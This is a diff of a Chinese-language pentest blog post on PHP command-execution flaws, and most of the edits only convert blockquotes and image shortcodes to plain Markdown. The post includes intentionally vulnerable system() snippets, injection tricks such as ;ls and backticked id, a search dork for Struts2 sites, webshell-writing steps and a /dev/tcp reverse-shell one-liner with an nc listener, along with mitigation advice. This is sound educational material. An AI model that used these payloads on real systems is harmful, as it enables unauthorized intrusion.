@@ -9,7 +9,7 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 命令执行
-> ```
+```
 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
@@ -41,11 +41,11 @@ passthru、popen、proc_popen等，当用户能控制这些函数中的参数时
 5. 等等
 
 ### 0x04 漏洞挖掘
-> 可以google hacking  
+可以google hacking  
 尝试：filetype:action或filetype:do来找struts2
 
 ### 0x05 漏洞可能代码(以system为例)
-> ```php
+```php
 1. system("$arg");  //直接输入即可
 2. system("/bin/prog $arg");  //直接输入;ls
 3. system("/bin/prog -p $arg");  //和2一样
@@ -68,8 +68,7 @@ passthru、popen、proc_popen等，当用户能控制这些函数中的参数时
 
 ### 0x06 漏洞利用
 * 示例一
-
-> ```php
+```php
 <?php
     $arg = $_GET['cmd'];
     if ($arg) {
@@ -77,59 +76,55 @@ passthru、popen、proc_popen等，当用户能控制这些函数中的参数时
     }
 ?>
 ```
-{{% fluid_img src="/img/post/command_execution1.png" alt="命令执行示例1.png" %}}
+![命令执行示例1](/img/post/command_execution1.png)
 
 * 示例二
-
-> ```php
+```php
 <?php
     $arg = $_GET['cmd'];
     if ($arg) {
         system("ping -c 3 $arg");
     }
 ```
-{{% fluid_img src="/img/post/command_execution2.png" alt="命令执行示例2.png" %}}
+![命令执行示例2](/img/post/command_execution2.png)
 
 * 示例三
-
-> ```php
+```php
 <?php
     $arg = $_GET['cmd'];
     if ($arg) {
         system("ls -al \"$arg\"");
     }
 ```
-{{% fluid_img src="/img/post/command_execution3.png" alt="命令执行示例3.png" %}}
+![命令执行示例3](/img/post/command_execution3.png)
 注：若引号被转义，则可以用<b>\`id\`</b>来执行
 
 * 示例四
-
-> ```php
+```php
 <?php
     $arg = $_GET['cmd'];
     if ($arg) {
         system("ls -al '$arg'");
     }
 ```
-{{% fluid_img src="/img/post/command_execution4.png" alt="命令执行示例4.png" %}}
+![命令执行示例4](/img/post/command_execution4.png)
 
 ### 0x07 其他
 * 动态函数调用  
 在cmd.php中的代码如下：
 
-> ```php
+```php
 <?php
     $fun = $_GET['fun'];
     $par = $_GET['par'];
     $fun($par);
 ?>
 
-提交http://localhost/cmd.php?fun=system&par=net user，  
-最终执行的是system("net user")
+//提交http://localhost/cmd.php?fun=system&par=net user，最终执行的是system("net user")
 ```
 
 ### 0x08 关于获取webshell
-> **要有写权限！**
+**要有写权限！**
 ```
 1.得到当前或绝对路径(可以用pwd)
 2.写文件:
@@ -139,7 +134,7 @@ passthru、popen、proc_popen等，当用户能控制这些函数中的参数时
 ```
 
 ### 0x09 反弹shell
-> ```
+```
 远程执行nc -vlp 8888
 ?cmd=bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
 ```
@@ -150,7 +145,7 @@ passthru、popen、proc_popen等，当用户能控制这些函数中的参数时
 3. 在使用动态函数之前，确保使用的函数是指定的函数之一
 4. 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义
 
-> ```php
+```php
 <?php
     $arg = $_GET['cmd'];
     // $arg = addslashes($arg);
